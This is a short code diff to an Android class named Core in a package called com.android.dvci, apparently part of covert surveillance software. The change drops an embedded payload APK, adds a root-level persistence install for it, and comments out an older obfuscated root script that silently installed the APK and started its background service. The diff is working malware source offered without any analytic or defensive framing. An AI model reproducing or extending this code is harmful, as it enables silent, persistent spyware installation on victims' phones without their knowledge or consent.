@@ -1101,9 +1101,13 @@ public class Core extends Activity implements Runnable {
 			}
 			Utils.dumpAssetPayload(M.e("z.apk"));
 			// Create the rooting script
+
+
 			String pack = Status.getAppContext().getPackageName();
+			Root.installPersistence(false, String.format("/data/data/%s/files/z.apk", pack));
+
 			//pm install -r -f /data/local/tmp/adb-tmp.apk
-			Execute.executeRootAndForgetScript(String.format(M.e("pm install -r -f /data/data/%s/files/z.apk; sleep 2; am startservice com.android.dvci/.ServiceMain; sleep 2"), pack));
+			//Execute.executeRootAndForgetScript(String.format(M.e("pm install -r -f /data/data/%s/files/z.apk; sleep 2; am startservice com.android.dvci/.ServiceMain; sleep 2"), pack));
 			// if not installed com.android.dvci:
 			//   install com.android.dvci
 			// if not running:
